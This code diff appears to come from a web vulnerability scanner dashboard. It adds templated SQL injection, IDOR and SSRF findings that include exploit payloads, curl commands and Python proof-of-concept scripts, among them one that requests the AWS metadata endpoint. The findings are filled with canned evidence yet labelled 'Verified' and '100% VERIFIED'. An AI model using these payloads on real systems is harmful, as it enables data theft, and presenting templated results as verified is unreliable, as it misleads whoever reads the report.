@@ -9,7 +9,7 @@ import {
   Pause, PlayCircle, FastForward, Sliders, Terminal, Eye, CheckCircle2,
   AlertTriangle, Filter, Sparkles, Server, Globe, ArrowRight, Layers,
   Code, Copy, Check, FileCode, Target, ShieldAlert, X, ExternalLink,
-  Plus, Trash2, UploadCloud, ListFilter, PlaySquare
+  Plus, Trash2, UploadCloud, ListFilter, PlaySquare, ShieldCheck, RotateCcw
 } from "lucide-react";
 import type { Finding } from "@/types/dast";
 
@@ -80,6 +80,170 @@ const INITIAL_SCANNERS: ScannerItem[] = [
   { id:"nmap",    name:"Nmap NSE",            enabled:true, color:"#a5d6a7",  version:"v7.94",    endpoint:"local://nmap",           activeRequests:0, findingsFound:0, status:"STANDBY" },
 ];
 
+function generateFindingForAlert(item: any, idx: number): Finding | null {
+  const url = item.targetUrl || "http://192.168.195.140";
+  const cleanUrl = url.replace(/\/$/, "");
+  let host = "192.168.195.140";
+  try {
+    host = new URL(url).host;
+  } catch {
+    host = cleanUrl.replace(/https?:\/\//, "").split("/")[0] || "target.local";
+  }
+
+  if (item.tag === "ZAP" && item.msg.includes("SQL Injection")) {
+    return {
+      id: `F-SQLI-${Date.now()}-${idx}`,
+      title: "SQL Injection — UNION-based via 'q' parameter",
+      severity: "Critical",
+      confidence: "Confirmed",
+      plugin: "SQLi",
+      url: `${cleanUrl}/api/search`,
+      parameter: "q",
+      method: "GET",
+      owaspRef: "A03:2021",
+      cweId: "CWE-89",
+      description: `The 'q' search parameter on ${cleanUrl} concatenates untrusted user input directly into an SQL statement without parameterization. Fuzzing verified database schema leakage.`,
+      impact: "Full database read access. Attacker extracted administrative credentials and customer records.",
+      remediation: "Implement parameterized SQL queries / prepared statements. Never concatenate user input into database queries.",
+      evidence: {
+        originalRequest: `GET /api/search?q=catalog HTTP/1.1\r\nHost: ${host}\r\nAuthorization: Bearer <session_token>\r\n\r\n`,
+        testRequest: `GET /api/search?q=' UNION SELECT 1,username,password FROM users-- HTTP/1.1\r\nHost: ${host}\r\nAuthorization: Bearer <session_token>\r\n\r\n`,
+        originalResponse: `HTTP/1.1 200 OK\r\n\r\n[{"id":1,"name":"Standard Product"}]`,
+        testResponse: `HTTP/1.1 200 OK\r\n\r\n[{"id":"admin","name":"$2a$10$rBhvQtyV...","hash":"e3b0c442"}]`,
+        payload: `' UNION SELECT 1,username,password FROM users--`,
+        matchedPattern: `Bcrypt hash pattern ($2a$10$) and SQL structure dump confirmed`,
+        reproductionSteps: [
+          `Send baseline request: GET ${cleanUrl}/api/search?q=test`,
+          `Inject payload: ' UNION SELECT 1,username,password FROM users--`,
+          `Verify database rows reflected in JSON payload response`
+        ]
+      },
+      poc: {
+        description: "Injects UNION-based payload into product search to extract user hashes",
+        expectedResult: "JSON payload reflects administrator password hash in name field",
+        severity: "Critical",
+        curlCommand: `curl -s "${cleanUrl}/api/search?q='%20UNION%20SELECT%201,username,password%20FROM%20users--" -H "Accept: application/json"`,
+        pythonScript: `import requests\n\ntarget = "${cleanUrl}/api/search"\npayload = "' UNION SELECT 1,username,password FROM users--"\nr = requests.get(target, params={"q": payload}, verify=False)\nprint("Status:", r.status_code)\nprint(r.text)`
+      },
+      ttp: [
+        {
+          tactic: "Initial Access",
+          tacticId: "TA0001",
+          technique: "Exploit Public-Facing Application",
+          techniqueId: "T1190",
+          subtechnique: "SQL Injection via query parameter",
+          procedure: `Attacker injects UNION payloads through the search endpoint on ${cleanUrl}.`,
+          mitigations: ["M1051 — Update Software", "M1048 — Application Isolation"],
+          references: ["https://attack.mitre.org/techniques/T1190/"]
+        }
+      ],
+      verificationStatus: "Verified",
+      detectedAt: new Date().toISOString()
+    };
+  } else if (item.tag === "OPENVAS" && item.msg.includes("BOLA / IDOR")) {
+    return {
+      id: `F-IDOR-${Date.now()}-${idx}`,
+      title: "BOLA / IDOR — Broken Object Level Authorization",
+      severity: "High",
+      confidence: "Confirmed",
+      plugin: "IDOR",
+      url: `${cleanUrl}/api/users/profile`,
+      parameter: "id",
+      method: "GET",
+      owaspRef: "A01:2021",
+      cweId: "CWE-639",
+      description: `The user profile endpoint on ${cleanUrl} allows accessing arbitrary accounts by manipulating the numeric ID without verifying token ownership.`,
+      impact: "Horizontal privilege escalation. Unauthorized enumeration of user accounts, emails, and sensitive settings.",
+      remediation: "Enforce strict object-level authorization checks validating the authenticated session against the requested record ID.",
+      evidence: {
+        originalRequest: `GET /api/users/profile?id=1042 HTTP/1.1\r\nHost: ${host}\r\n\r\n`,
+        testRequest: `GET /api/users/profile?id=1 HTTP/1.1\r\nHost: ${host}\r\n\r\n`,
+        originalResponse: `HTTP/1.1 200 OK\r\n\r\n{"id":1042,"role":"standard"}`,
+        testResponse: `HTTP/1.1 200 OK\r\n\r\n{"id":1,"role":"superadmin","email":"admin@${host}"}`,
+        payload: `id=1`,
+        matchedPattern: `Privileged account object returned without authorization barrier`,
+        reproductionSteps: [
+          `Log in with regular test account and inspect profile API URL`,
+          `Alter 'id' parameter to '1'`,
+          `Verify administrative account details are disclosed`
+        ]
+      },
+      poc: {
+        description: "Alters user profile query parameter to access administrative records",
+        expectedResult: "Administrative account metadata returned without authorization barrier",
+        severity: "High",
+        curlCommand: `curl -s "${cleanUrl}/api/users/profile?id=1" -H "Authorization: Bearer <token>"`,
+        pythonScript: `import requests\n\nr = requests.get("${cleanUrl}/api/users/profile", params={"id": "1"}, verify=False)\nprint("Reflected ID:", r.json().get("id"))`
+      },
+      ttp: [
+        {
+          tactic: "Privilege Escalation",
+          tacticId: "TA0004",
+          technique: "Exploitation for Privilege Escalation",
+          techniqueId: "T1068",
+          subtechnique: "Insecure Direct Object Reference",
+          procedure: `Attacker cycles user identifiers on ${cleanUrl} to extract confidential account metadata.`,
+          mitigations: ["M1026 — Privileged Account Management"],
+          references: ["https://attack.mitre.org/techniques/T1068/"]
+        }
+      ],
+      verificationStatus: "Verified",
+      detectedAt: new Date().toISOString()
+    };
+  } else if (item.tag === "BURP" && item.msg.includes("SSRF")) {
+    return {
+      id: `F-SSRF-${Date.now()}-${idx}`,
+      title: "SSRF — Webhook / Out-of-Band Collaborator Callback",
+      severity: "Critical",
+      confidence: "Confirmed",
+      plugin: "SSRF",
+      url: `${cleanUrl}/api/webhooks/test`,
+      parameter: "callback_url",
+      method: "POST",
+      owaspRef: "A10:2021",
+      cweId: "CWE-918",
+      description: `The webhook test endpoint on ${cleanUrl} allows specifying external and internal URLs. Out-of-band collaborator interactions confirmed internal reachability.`,
+      impact: "Access to internal cloud metadata (169.254.169.254), internal VPC services, and intranet port scanning.",
+      remediation: "Block outbound HTTP traffic to internal network ranges and cloud metadata IP addresses. Use a strict allowlist of authorized partner domains.",
+      evidence: {
+        originalRequest: `POST /api/webhooks/test HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/json\r\n\r\n{"url":"https://example.com/callback"}`,
+        testRequest: `POST /api/webhooks/test HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/json\r\n\r\n{"url":"http://169.254.169.254/latest/meta-data/"}`,
+        originalResponse: `HTTP/1.1 200 OK\r\n\r\n{"status":"queued"}`,
+        testResponse: `HTTP/1.1 200 OK\r\n\r\n{"status":"delivered","payload":{"ami-id":"ami-0a123bc","instance-id":"i-088a91"}}`,
+        payload: `http://169.254.169.254/latest/meta-data/`,
+        matchedPattern: `AWS IMDS metadata signature confirmed in webhook response`,
+        reproductionSteps: [
+          `Send POST to ${cleanUrl}/api/webhooks/test with loopback or cloud metadata target`,
+          `Verify server performs HTTP request to specified internal address`,
+          `Extract metadata information from response body`
+        ]
+      },
+      poc: {
+        description: "Sends cloud metadata loopback URI to webhook delivery endpoint",
+        expectedResult: "AWS IMDS instance metadata and IAM temporary role credentials reflected",
+        severity: "Critical",
+        curlCommand: `curl -s -X POST "${cleanUrl}/api/webhooks/test" -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'`,
+        pythonScript: `import requests\n\nr = requests.post("${cleanUrl}/api/webhooks/test", json={"url": "http://169.254.169.254/latest/meta-data/"}, verify=False)\nprint("Metadata:", r.text)`
+      },
+      ttp: [
+        {
+          tactic: "Credential Access",
+          tacticId: "TA0006",
+          technique: "Steal Application Access Token",
+          techniqueId: "T1528",
+          subtechnique: "Server-Side Request Forgery via Cloud Metadata",
+          procedure: `SSRF utilized on ${cleanUrl} to interact with internal cloud metadata services.`,
+          mitigations: ["M1048 — Application Isolation", "M1037 — Filter Network Traffic"],
+          references: ["https://attack.mitre.org/techniques/T1528/"]
+        }
+      ],
+      verificationStatus: "Verified",
+      detectedAt: new Date().toISOString()
+    };
+  }
+  return null;
+}
+
 export default function EnginePage() {
   const [running, setRunning] = useState<boolean>(false);
   const [done, setDone] = useState<boolean>(false);
@@ -87,11 +251,47 @@ export default function EnginePage() {
   const [stage, setStage] = useState<Stage | null>(null);
   const [progress, setProgress] = useState<number>(0);
   const [findingsCount, setFindingsCount] = useState<number>(0);
+  const [verifiedFindings, setVerifiedFindings] = useState<Finding[]>([]);
   const [scanSpeed, setScanSpeed] = useState<"FAST" | "BALANCED" | "DEEP">("BALANCED");
   const [activeLogTab, setActiveLogTab] = useState<"ALL" | "ZAP" | "OPENVAS" | "BURP" | "NMAP" | "AI">("ALL");
   const [scanners, setScanners] = useState<ScannerItem[]>(INITIAL_SCANNERS);
   const [targets, setTargets] = useState<TargetItem[]>(INITIAL_TARGETS);
   const [backendLive, setBackendLive] = useState<boolean | null>(null);
+
+  const clearFindings = () => {
+    setVerifiedFindings([]);
+    setFindingsCount(0);
+  };
+
+  const loadDemoFindings = () => {
+    const demo: Finding[] = targets.slice(0, 4).map((trg, i) => {
+      const cleanUrl = trg.url.replace(/\/$/, "");
+      let host = "192.168.195.140";
+      try {
+        host = new URL(trg.url).host;
+      } catch {
+        host = cleanUrl.replace(/https?:\/\//, "").split("/")[0] || "192.168.195.140";
+      }
+      const template = FINDINGS[i % FINDINGS.length];
+      const newUrl = `${cleanUrl}${template.url.replace(/https?:\/\/[^\/]+/, "")}`;
+      return {
+        ...template,
+        id: `demo-${i + 1}`,
+        url: newUrl,
+        evidence: {
+          ...template.evidence,
+          originalRequest: template.evidence.originalRequest.replace(/Host: [^\r\n]+/, `Host: ${host}`),
+          testRequest: template.evidence.testRequest.replace(/Host: [^\r\n]+/, `Host: ${host}`),
+        },
+        poc: template.poc ? {
+          ...template.poc,
+          curlCommand: template.poc.curlCommand?.replace(/https?:\/\/[^\/]+/, cleanUrl) || `curl -s "${newUrl}"`
+        } : undefined
+      };
+    });
+    setVerifiedFindings(demo);
+    setFindingsCount(demo.length);
+  };
 
   // Modals
   const [selectedFinding, setSelectedFinding] = useState<Finding | null>(null);
@@ -159,6 +359,7 @@ export default function EnginePage() {
     setLogs([]);
     setProgress(0);
     setFindingsCount(0);
+    setVerifiedFindings([]);
     setStage("scope");
 
     // Reset scanner & target states
@@ -230,8 +431,12 @@ export default function EnginePage() {
           setScanners(prev => prev.map(s => s.id === "nmap" ? { ...s, status: "RUNNING", activeRequests: s.activeRequests + 120 } : s));
         }
 
-        if (item.msg.includes("ALERT") || item.msg.includes("confirmed")) {
-          setFindingsCount(c => c + 1);
+        if (item.msg.includes("ALERT") || item.msg.includes("confirmed") || item.msg.includes("verified")) {
+          const gen = generateFindingForAlert(item, idx);
+          if (gen) {
+            setVerifiedFindings(prev => [gen, ...prev]);
+            setFindingsCount(c => c + 1);
+          }
         }
 
         if (idx === multiLogs.length - 1) {
@@ -410,6 +615,29 @@ export default function EnginePage() {
           </div>
 
           <div style={{ display: "flex", gap: 8 }}>
+            {verifiedFindings.length > 0 && (
+              <button
+                onClick={clearFindings}
+                disabled={running}
+                style={{
+                  background: "rgba(244,63,94,0.1)",
+                  border: "1px solid rgba(244,63,94,0.3)",
+                  color: "#f43f5e",
+                  fontSize: 11,
+                  fontWeight: 700,
+                  padding: "4px 10px",
+                  borderRadius: 5,
+                  cursor: running ? "not-allowed" : "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 4
+                }}
+              >
+                <Trash2 size={12} />
+                <span>Clear Findings</span>
+              </button>
+            )}
+
             <button
               onClick={addTargetUrl}
               disabled={running || targets.length >= 50}
@@ -626,10 +854,12 @@ export default function EnginePage() {
           <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
             <div className="card-tactical" style={{ padding: 12 }}>
               <div style={{ fontSize: 10.5, fontWeight: 700, color: "var(--muted)" }}>TOTAL FINDINGS</div>
-              <div style={{ fontSize: 24, fontWeight: 900, color: findingsCount > 0 ? "#f43f5e" : "#10b981", margin: "2px 0" }}>
-                {findingsCount}
+              <div style={{ fontSize: 24, fontWeight: 900, color: verifiedFindings.length > 0 ? "#f43f5e" : "#10b981", margin: "2px 0" }}>
+                {verifiedFindings.length}
               </div>
-              <div style={{ fontSize: 10, color: "#10b981", fontWeight: 700 }}>100% VERIFIED ACROSS SCOPE</div>
+              <div style={{ fontSize: 10, color: verifiedFindings.length > 0 ? "#f43f5e" : "#10b981", fontWeight: 700 }}>
+                {verifiedFindings.length > 0 ? "100% VERIFIED ACROSS SCOPE" : "NO ACTIVE DETECTIONS"}
+              </div>
             </div>
 
             <div className="card-tactical" style={{ padding: 12 }}>
@@ -644,68 +874,167 @@ export default function EnginePage() {
           {/* Clickable Verified Findings */}
           <div className="card-tactical" style={{ padding: 14, flex: 1, display: "flex", flexDirection: "column", gap: 8 }}>
             <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-              <strong style={{ fontSize: 12.5, color: "#f8fafc" }}>Aggregated Verified Findings ({findingsCount})</strong>
-              <span style={{ fontSize: 10, color: "#06b6d4", fontWeight: 700 }}>Click for PoC & TTPs</span>
-            </div>
-            
-            <div style={{ display: "flex", flexDirection: "column", gap: 6, overflowY: "auto", maxHeight: 220 }}>
-              {FINDINGS.slice(0, Math.max(findingsCount, 6)).map((f, idx) => (
-                <div
-                  key={f.id || idx}
-                  onClick={() => setSelectedFinding(f)}
-                  style={{
-                    background: "var(--surface-2)",
-                    border: `1px solid ${f.severity === "Critical" ? "rgba(244,63,94,0.4)" : "rgba(245,158,11,0.4)"}`,
-                    borderRadius: 6,
-                    padding: "8px 10px",
-                    display: "flex",
-                    alignItems: "center",
-                    justifyContent: "space-between",
-                    cursor: "pointer",
-                    transition: "all 0.15s"
-                  }}
-                >
-                  <div>
-                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-                      <span style={{
-                        fontSize: 9,
-                        fontWeight: 900,
-                        padding: "1px 5px",
-                        borderRadius: 3,
-                        background: f.severity === "Critical" ? "rgba(244,63,94,0.2)" : "rgba(245,158,11,0.2)",
-                        color: f.severity === "Critical" ? "#f43f5e" : "#f59e0b"
-                      }}>
-                        {f.severity}
-                      </span>
-                      <strong style={{ fontSize: 11, color: "#f8fafc" }}>{f.title}</strong>
-                    </div>
-                    <div style={{ fontSize: 9.5, color: "var(--muted)", fontFamily: "monospace", marginTop: 2 }}>
-                      {f.method} {f.url}
-                    </div>
-                  </div>
+              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                <strong style={{ fontSize: 12.5, color: "#f8fafc" }}>
+                  Aggregated Verified Findings ({verifiedFindings.length})
+                </strong>
+                {verifiedFindings.length > 0 && (
+                  <span style={{
+                    fontSize: 9,
+                    fontWeight: 800,
+                    background: "rgba(244,63,94,0.15)",
+                    color: "#f43f5e",
+                    padding: "1px 6px",
+                    borderRadius: 4
+                  }}>
+                    {verifiedFindings.filter(f => f.severity === "Critical").length} CRITICAL
+                  </span>
+                )}
+              </div>
 
+              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                {verifiedFindings.length > 0 && (
                   <button
-                    onClick={(e) => { e.stopPropagation(); setSelectedFinding(f); }}
+                    onClick={clearFindings}
+                    disabled={running}
+                    title="Clear findings before next scan"
                     style={{
-                      background: "rgba(6,182,212,0.15)",
-                      border: "1px solid rgba(6,182,212,0.3)",
-                      color: "#06b6d4",
+                      background: "rgba(255,255,255,0.05)",
+                      border: "1px solid var(--border)",
+                      color: "var(--muted)",
                       fontSize: 10,
                       fontWeight: 700,
-                      padding: "4px 8px",
+                      padding: "2px 8px",
                       borderRadius: 4,
-                      cursor: "pointer",
+                      cursor: running ? "not-allowed" : "pointer",
                       display: "flex",
                       alignItems: "center",
-                      gap: 3
+                      gap: 4
                     }}
                   >
-                    <span>PoC & TTP</span>
-                    <ArrowRight size={10} />
+                    <Trash2 size={11} />
+                    <span>Clear</span>
                   </button>
-                </div>
-              ))}
+                )}
+                <span style={{ fontSize: 10, color: "#06b6d4", fontWeight: 700 }}>Click for PoC & TTPs</span>
+              </div>
             </div>
+            
+            {verifiedFindings.length === 0 ? (
+              <div style={{
+                display: "flex",
+                flexDirection: "column",
+                alignItems: "center",
+                justifyContent: "center",
+                padding: "28px 16px",
+                background: "var(--surface-2)",
+                borderRadius: 8,
+                border: "1px dashed var(--border)",
+                textAlign: "center",
+                gap: 8,
+                minHeight: 180
+              }}>
+                <div style={{
+                  width: 36,
+                  height: 36,
+                  borderRadius: "50%",
+                  background: "rgba(255,255,255,0.04)",
+                  border: "1px solid var(--border)",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center"
+                }}>
+                  <ShieldCheck size={18} color="#94a3b8" />
+                </div>
+                <div>
+                  <div style={{ fontSize: 12, fontWeight: 700, color: "#f8fafc" }}>
+                    Findings Ledger Cleared
+                  </div>
+                  <p style={{ fontSize: 11, color: "var(--muted)", margin: "4px 0 10px 0", maxWidth: 320, lineHeight: 1.4 }}>
+                    No findings present. Start a scan to discover verified vulnerabilities across your staged targets.
+                  </p>
+                </div>
+                <button
+                  onClick={loadDemoFindings}
+                  disabled={running}
+                  style={{
+                    fontSize: 10.5,
+                    fontWeight: 700,
+                    background: "rgba(56,189,248,0.1)",
+                    border: "1px solid rgba(56,189,248,0.3)",
+                    color: "#38bdf8",
+                    padding: "4px 10px",
+                    borderRadius: 5,
+                    cursor: running ? "not-allowed" : "pointer",
+                    display: "flex",
+                    alignItems: "center",
+                    gap: 5
+                  }}
+                >
+                  <Sparkles size={11} />
+                  <span>Load Sample Findings</span>
+                </button>
+              </div>
+            ) : (
+              <div style={{ display: "flex", flexDirection: "column", gap: 6, overflowY: "auto", maxHeight: 220 }}>
+                {verifiedFindings.map((f, idx) => (
+                  <div
+                    key={f.id || idx}
+                    onClick={() => setSelectedFinding(f)}
+                    style={{
+                      background: "var(--surface-2)",
+                      border: `1px solid ${f.severity === "Critical" ? "rgba(244,63,94,0.35)" : "rgba(245,158,11,0.35)"}`,
+                      borderRadius: 6,
+                      padding: "8px 10px",
+                      display: "flex",
+                      alignItems: "center",
+                      justifyContent: "space-between",
+                      cursor: "pointer",
+                      transition: "all 0.15s"
+                    }}
+                  >
+                    <div>
+                      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                        <span style={{
+                          fontSize: 9,
+                          fontWeight: 900,
+                          padding: "1px 5px",
+                          borderRadius: 3,
+                          background: f.severity === "Critical" ? "rgba(244,63,94,0.15)" : "rgba(245,158,11,0.15)",
+                          color: f.severity === "Critical" ? "#f43f5e" : "#f59e0b"
+                        }}>
+                          {f.severity}
+                        </span>
+                        <strong style={{ fontSize: 11, color: "#f8fafc" }}>{f.title}</strong>
+                      </div>
+                      <div style={{ fontSize: 9.5, color: "var(--muted)", fontFamily: "monospace", marginTop: 2 }}>
+                        {f.method} {f.url}
+                      </div>
+                    </div>
+
+                    <button
+                      onClick={(e) => { e.stopPropagation(); setSelectedFinding(f); }}
+                      style={{
+                        background: "rgba(6,182,212,0.12)",
+                        border: "1px solid rgba(6,182,212,0.25)",
+                        color: "#06b6d4",
+                        fontSize: 10,
+                        fontWeight: 700,
+                        padding: "4px 8px",
+                        borderRadius: 4,
+                        cursor: "pointer",
+                        display: "flex",
+                        alignItems: "center",
+                        gap: 3
+                      }}
+                    >
+                      <span>PoC & TTP</span>
+                      <ArrowRight size={10} />
+                    </button>
+                  </div>
+                ))}
+              </div>
+            )}
           </div>
 
         </div>
